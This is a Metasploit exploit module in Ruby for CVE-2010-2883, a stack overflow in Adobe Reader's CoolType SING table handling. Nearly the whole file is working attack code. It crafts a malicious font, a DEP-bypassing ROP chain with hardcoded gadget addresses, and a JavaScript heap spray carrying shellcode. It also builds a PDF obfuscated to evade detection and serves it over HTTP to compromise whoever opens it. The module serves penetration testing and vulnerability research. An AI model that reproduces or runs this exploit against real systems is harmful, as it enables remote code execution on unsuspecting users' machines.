##
# $Id: adobe_cooltype_sing.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'zlib'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking # aslr+dep bypass, js heap spray, rop, stack bof

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Adobe CoolType SING Table "uniqueName" Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a vulnerability in the Smart INdependent Glyplets (SING) table
				handling within versions 8.2.4 and 9.3.4 of Adobe Reader. Prior version are
				assumed to be vulnerable as well.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Unknown',    # 0day found in the wild
					'@sn0wfl0w',  # initial analysis
					'@vicheck',   # initial analysis
					'jduck'       # Metasploit module
				],
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					[ 'CVE', '2010-2883' ],
					[ 'OSVDB', '67849'],
					[ 'URL', 'http://contagiodump.blogspot.com/2010/09/cve-david-leadbetters-one-point-lesson.html' ],
					[ 'URL', 'http://www.adobe.com/support/security/advisories/apsa10-02.html' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC'             => 'process',
					'HTTP::compression' => 'gzip',
					'HTTP::chunked'     => true,
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00",
					'DisableNops' => true
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# Tested OK via Adobe Reader 9.3.4 on Windows XP SP3 -jjd
					# Tested OK via Adobe Reader 9.3.4 on Windows 7 -jjd
					[ 'Automatic', { }],
				],
			'DisclosureDate' => 'Sep 07 2010',
			'DefaultTarget'  => 0))
	end

	def exploit
		# NOTE: The 0day used Vera.ttf (785d2fd45984c6548763ae6702d83e20)
		path = File.join( Msf::Config.install_root, "data", "exploits", "cve-2010-2883.ttf" )
		fd = File.open( path, "rb" )
		@ttf_data = fd.read(fd.stat.size)
		fd.close

		super
	end


	def on_request_uri(cli, request)

		print_status("Sending crafted PDF to #{cli.peerhost}:#{cli.peerport}")

		ttf_data = make_ttf()

		js_data = make_js(regenerate_payload(cli).encoded)

		# Create the pdf
		pdf = make_pdf(ttf_data, js_data)

		send_response(cli, pdf, { 'Content-Type' => 'application/pdf', 'Pragma' => 'no-cache' })

		# Handle the payload
		handler(cli)
	end

	def make_ttf

		# load the static ttf file
		ttf_data = @ttf_data.dup

		# Build the SING table
		sing = ''
		sing << [
			0, 1,   # tableVersionMajor, tableVersionMinor (0.1)
			0xe01,  # glyphletVersion
			0x100,  # embeddingInfo
			0,      # mainGID
			0,      # unitsPerEm
			0,      # vertAdvance
			0x3a00  # vertOrigin
		].pack('vvvvvvvv')
		# uniqueName
		# "The uniqueName string must be a string of at most 27 7-bit ASCII characters"
		#sing << "A" * (0x254 - sing.length)
		sing << rand_text(0x254 - sing.length)

		# 0xffffffff gets written here @ 0x7001400 (in BIB.dll)
		sing[0x140, 4] = [0x4a8a08e2 - 0x1c].pack('V')

		# This becomes our new EIP (puts esp to stack buffer)
		ret = 0x4a80cb38 # add ebp, 0x794 / leave / ret
		sing[0x208, 4] = [ret].pack('V')

		# This becomes the new eip after the first return
		ret = 0x4a82a714
		sing[0x18, 4] = [ret].pack('V')

		# This becomes the new esp after the first return
		esp = 0x0c0c0c0c
		sing[0x1c, 4] = [esp].pack('V')

		# Without the following, sub_801ba57 returns 0.
		sing[0x24c, 4] = [0x6c].pack('V')

		ttf_data[0xec, 4] = "SING"
		ttf_data[0x11c, sing.length] = sing

		ttf_data
	end

	def make_js(encoded_payload)

		# The following executes a ret2lib using icucnv36.dll
		# The effect is to bypass DEP and execute the shellcode in an indirect way
		stack_data = [
			0x41414141,   # unused
			0x4a8063a5,   # pop ecx / ret
			0x4a8a0000,   # becomes ecx

			0x4a802196,   # mov [ecx],eax / ret # save whatever eax starts as

			0x4a801f90,   # pop eax / ret
			0x4a84903c,   # becomes eax (import for CreateFileA)

			# -- call CreateFileA
			0x4a80b692,   # jmp [eax]

			0x4a801064,   # ret

			0x4a8522c8,   # first arg to CreateFileA (lpFileName / pointer to "iso88591")
			0x10000000,   # second arg  - dwDesiredAccess
			0x00000000,   # third arg   - dwShareMode
			0x00000000,   # fourth arg  - lpSecurityAttributes
			0x00000002,   # fifth arg   - dwCreationDisposition
			0x00000102,   # sixth arg   - dwFlagsAndAttributes
			0x00000000,   # seventh arg - hTemplateFile

			0x4a8063a5,   # pop ecx / ret
			0x4a801064,   # becomes ecx

			0x4a842db2,   # xchg eax,edi / ret

			0x4a802ab1,   # pop ebx / ret
			0x00000008,   # becomes ebx - offset to modify

			#
			# This points at a neat-o block of code that ... TBD
			#
			#   and [esp+ebx*2],edi
			#   jne check_slash
			# ret_one:
			#   mov al,1
			#   ret
			# check_slash:
			#   cmp al,0x2f
			#   je ret_one
			#   cmp al,0x41
			#   jl check_lower
			#   cmp al,0x5a
			#   jle check_ptr
			# check_lower:
			#   cmp al,0x61
			#   jl ret_zero
			#   cmp al,0x7a
			#   jg ret_zero
			#   cmp [ecx+1],0x3a
			#   je ret_one
			# ret_zero:
			#   xor al,al
			#   ret
			#

			0x4a80a8a6,   # execute fun block

			0x4a801f90,   # pop eax / ret
			0x4a849038,   # becomes eax (import for CreateFileMappingA)

			# -- call CreateFileMappingA
			0x4a80b692,   # jmp [eax]

			0x4a801064,   # ret

			0xffffffff,   # arguments to CreateFileMappingA, hFile
			0x00000000,   # lpAttributes
			0x00000040,   # flProtect
			0x00000000,   # dwMaximumSizeHigh
			0x00010000,   # dwMaximumSizeLow
			0x00000000,   # lpName

			0x4a8063a5,   # pop ecx / ret
			0x4a801064,   # becomes ecx

			0x4a842db2,   # xchg eax,edi / ret

			0x4a802ab1,   # pop ebx / ret
			0x00000008,   # becomes ebx - offset to modify

			0x4a80a8a6,   # execute fun block

			0x4a801f90,   # pop eax / ret
			0x4a849030,   # becomes eax (import for MapViewOfFile

			# -- call MapViewOfFile
			0x4a80b692,   # jmp [eax]

			0x4a801064,   # ret

			0xffffffff,   # args to MapViewOfFile - hFileMappingObject
			0x00000022,   # dwDesiredAccess
			0x00000000,   # dwFileOffsetHigh
			0x00000000,   # dwFileOffsetLow
			0x00010000,   # dwNumberOfBytesToMap

			0x4a8063a5,   # pop ecx / ret
			0x4a8a0004,   # becomes ecx - writable pointer

			0x4a802196,   # mov [ecx],eax / ret - save map base addr

			0x4a8063a5,   # pop ecx / ret
			0x4a801064,   # becomes ecx - ptr to ret

			0x4a842db2,   # xchg eax,edi / ret

			0x4a802ab1,   # pop ebx / ret
			0x00000030,   # becomes ebx - offset to modify

			0x4a80a8a6,   # execute fun block

			0x4a801f90,   # pop eax / ret
			0x4a8a0004,   # becomes eax - saved file mapping ptr

			0x4a80a7d8,   # mov eax,[eax] / ret - load saved mapping ptr

			0x4a8063a5,   # pop ecx / ret
			0x4a801064,   # becomes ecx - ptr to ret

			0x4a842db2,   # xchg eax,edi / ret

			0x4a802ab1,   # pop ebx / ret
			0x00000020,   # becomes ebx - offset to modify

			0x4a80a8a6,   # execute fun block

			0x4a8063a5,   # pop ecx / ret
			0x4a801064,   # becomes ecx - ptr to ret

			0x4a80aedc,   # lea edx,[esp+0xc] / push edx / push eax / push [esp+0xc] / push [0x4a8a093c] / call ecx / add esp, 0x10 / ret

			0x4a801f90,   # pop eax / ret
			0x00000034,   # becomes eax

			0x4a80d585,   # add eax,edx / ret

			0x4a8063a5,   # pop ecx / ret
			0x4a801064,   # becomes ecx - ptr to ret

			0x4a842db2,   # xchg eax,edi / ret

			0x4a802ab1,   # pop ebx / ret
			0x0000000a,   # becomes ebx - offset to modify

			0x4a80a8a6,   # execute fun block

			0x4a801f90,   # pop eax / ret
			0x4a849170,   # becomes eax (import for memcpy)

			# -- call memcpy
			0x4a80b692,   # jmp [eax]

			0xffffffff,   # this stuff gets overwritten by the block at 0x4a80aedc, becomes ret from memcpy
			0xffffffff,   # becomes first arg to memcpy (dst)
			0xffffffff,   # becomes second arg to memcpy (src)
			0x00001000,   # becomes third arg to memcpy (length)
			#0x0000258b,   # ??
			#0x4d4d4a8a,   # ??
		].pack('V*')

		var_unescape  = rand_text_alpha(rand(100) + 1)
		var_shellcode = rand_text_alpha(rand(100) + 1)

		var_start     = rand_text_alpha(rand(100) + 1)

		var_s         = 0x10000
		var_c         = rand_text_alpha(rand(100) + 1)
		var_b         = rand_text_alpha(rand(100) + 1)
		var_d         = rand_text_alpha(rand(100) + 1)
		var_3         = rand_text_alpha(rand(100) + 1)
		var_i         = rand_text_alpha(rand(100) + 1)
		var_4         = rand_text_alpha(rand(100) + 1)

		payload_buf = ''
		payload_buf << stack_data
		payload_buf << encoded_payload

		escaped_payload = Rex::Text.to_unescape(payload_buf)

		js = %Q|
var #{var_unescape} = unescape;
var #{var_shellcode} = #{var_unescape}( '#{escaped_payload}' );
var #{var_c} = #{var_unescape}( "%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c" );
while (#{var_c}.length + 20 + 8 < #{var_s}) #{var_c}+=#{var_c};
#{var_b} = #{var_c}.substring(0, (0x0c0c-0x24)/2);
#{var_b} += #{var_shellcode};
#{var_b} += #{var_c};
#{var_d} = #{var_b}.substring(0, #{var_s}/2);
while(#{var_d}.length < 0x80000) #{var_d} += #{var_d};
#{var_3} = #{var_d}.substring(0, 0x80000 - (0x1020-0x08) / 2);
var #{var_4} = new Array();
for (#{var_i}=0;#{var_i}<0x1f0;#{var_i}++) #{var_4}[#{var_i}]=#{var_3}+"s";
|

		js
	end

	def RandomNonASCIIString(count)
		result = ""
		count.times do
			result << (rand(128) + 128).chr
		end
		result
	end

	def ioDef(id)
		"%d 0 obj \n" % id
	end

	def ioRef(id)
		"%d 0 R" % id
	end


	#http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
	def nObfu(str)
		#return str
		result = ""
		str.scan(/./u) do |c|
			if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'
				result << "#%x" % c.unpack("C*")[0]
			else
				result << c
			end
		end
		result
	end


	def ASCIIHexWhitespaceEncode(str)
		result = ""
		whitespace = ""
		str.each_byte do |b|
			result << whitespace << "%02x" % b
			whitespace = " " * (rand(3) + 1)
		end
		result << ">"
	end


	def make_pdf(ttf, js)

		#swf_name = rand_text_alpha(8 + rand(8)) + ".swf"

		xref = []
		eol = "\n"
		endobj = "endobj" << eol

		# Randomize PDF version?
		pdf = "%PDF-1.5" << eol
		pdf << "%" << RandomNonASCIIString(4) << eol

		# catalog
		xref << pdf.length
		pdf << ioDef(1) << nObfu("<<") << eol
		pdf << nObfu("/Pages ") << ioRef(2) << eol
		pdf << nObfu("/Type /Catalog") << eol
		pdf << nObfu("/OpenAction ") << ioRef(11) << eol
		# The AcroForm is required to get icucnv36.dll to load
		pdf << nObfu("/AcroForm ") << ioRef(13) << eol
		pdf << nObfu(">>") << eol
		pdf << endobj

		# pages array
		xref << pdf.length
		pdf << ioDef(2) << nObfu("<<") << eol
		pdf << nObfu("/MediaBox ") << ioRef(3) << eol
		pdf << nObfu("/Resources ") << ioRef(4) << eol
		pdf << nObfu("/Kids [") << ioRef(5) << "]" << eol
		pdf << nObfu("/Count 1") << eol
		pdf << nObfu("/Type /Pages") << eol
		pdf << nObfu(">>") << eol
		pdf << endobj

		# media box
		xref << pdf.length
		pdf << ioDef(3)
		pdf << "[0 0 595 842]" << eol
		pdf << endobj

		# resources
		xref << pdf.length
		pdf << ioDef(4)
		pdf << nObfu("<<") << eol
		pdf << nObfu("/Font ") << ioRef(6) << eol
		pdf << ">>" << eol
		pdf << endobj

		# page 1
		xref << pdf.length
		pdf << ioDef(5) << nObfu("<<") << eol
		pdf << nObfu("/Parent ") << ioRef(2) << eol
		pdf << nObfu("/MediaBox ") << ioRef(3) << eol
		pdf << nObfu("/Resources ") << ioRef(4) << eol
		pdf << nObfu("/Contents [") << ioRef(8) << nObfu("]") << eol
		pdf << nObfu("/Type /Page") << eol
		pdf << nObfu(">>") << eol # end obj dict
		pdf << endobj

		# font
		xref << pdf.length
		pdf << ioDef(6) << nObfu("<<") << eol
		pdf << nObfu("/F1 ") << ioRef(7) << eol
		pdf << ">>" << eol
		pdf << endobj

		# ttf object
		xref << pdf.length
		pdf << ioDef(7) << nObfu("<<") << eol
		pdf << nObfu("/Type /Font") << eol
		pdf << nObfu("/Subtype /TrueType") << eol
		pdf << nObfu("/Name /F1") << eol
		pdf << nObfu("/BaseFont /Cinema") << eol
		pdf << nObfu("/Widths []") << eol
		pdf << nObfu("/FontDescriptor ") << ioRef(9)
		pdf << nObfu("/Encoding /MacRomanEncoding")
		pdf << nObfu(">>") << eol
		pdf << endobj

		# page content
		content = "Hello World!"
		content = "" +
			"0 g" + eol +
			"BT" + eol +
			"/F1 32 Tf" + eol +
			"32 Tc" + eol +
			"1 0 0 1 32 773.872 Tm" + eol +
			"(" + content + ") Tj" + eol +
			"ET"

		xref << pdf.length
		pdf << ioDef(8) << "<<" << eol
		pdf << nObfu("/Length %s" % content.length) << eol
		pdf << ">>" << eol
		pdf << "stream" << eol
		pdf << content << eol
		pdf << "endstream" << eol
		pdf << endobj

		# font descriptor
		xref << pdf.length
		pdf << ioDef(9) << nObfu("<<")
		pdf << nObfu("/Type/FontDescriptor/FontName/Cinema")
		pdf << nObfu("/Flags %d" % (2**2 + 2**6 + 2**17))
		pdf << nObfu("/FontBBox [-177 -269 1123 866]")
		pdf << nObfu("/FontFile2 ") << ioRef(10)
		pdf << nObfu(">>") << eol
		pdf << endobj

		# ttf stream
		xref << pdf.length
		compressed = Zlib::Deflate.deflate(ttf)
		pdf << ioDef(10) << nObfu("<</Length %s/Filter/FlateDecode/Length1 %s>>" % [compressed.length, ttf.length]) << eol
		pdf << "stream" << eol
		pdf << compressed << eol
		pdf << "endstream" << eol
		pdf << endobj

		# js action
		xref << pdf.length
		pdf << ioDef(11) << nObfu("<<")
		pdf << nObfu("/Type/Action/S/JavaScript/JS ") + ioRef(12)
		pdf << nObfu(">>") << eol
		pdf << endobj

		# js stream
		xref << pdf.length
		compressed = Zlib::Deflate.deflate(ASCIIHexWhitespaceEncode(js))
		pdf << ioDef(12) << nObfu("<</Length %s/Filter[/FlateDecode/ASCIIHexDecode]>>" % compressed.length) << eol
		pdf << "stream" << eol
		pdf << compressed << eol
		pdf << "endstream" << eol
		pdf << endobj

		###
		# The following form related data is required to get icucnv36.dll to load
		###

		# form object
		xref << pdf.length
		pdf << ioDef(13)
		pdf << nObfu("<</XFA ") << ioRef(14) << nObfu(">>") << eol
		pdf << endobj

		# form stream
		xfa = <<-EOF
<?xml version="1.0" encoding="UTF-8"?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config xmlns="http://www.xfa.org/schema/xci/2.6/">
<present><pdf><interactive>1</interactive></pdf></present>
</config>
<template xmlns="http://www.xfa.org/schema/xfa-template/2.6/">
<subform name="form1" layout="tb" locale="en_US">
<pageSet></pageSet>
</subform></template></xdp:xdp>
EOF

		xref << pdf.length
		pdf << ioDef(14) << nObfu("<</Length %s>>" % xfa.length) << eol
		pdf << "stream" << eol
		pdf << xfa << eol
		pdf << "endstream" << eol
		pdf << endobj

		###
		# end form stuff for icucnv36.dll
		###


		# trailing stuff
		xrefPosition = pdf.length
		pdf << "xref" << eol
		pdf << "0 %d" % (xref.length + 1) << eol
		pdf << "0000000000 65535 f" << eol
		xref.each do |index|
			pdf << "%010d 00000 n" % index << eol
		end

		pdf << "trailer" << eol
		pdf << nObfu("<</Size %d/Root " % (xref.length + 1)) << ioRef(1) << ">>" << eol

		pdf << "startxref" << eol
		pdf << xrefPosition.to_s() << eol

		pdf << "%%EOF" << eol
		pdf
	end

end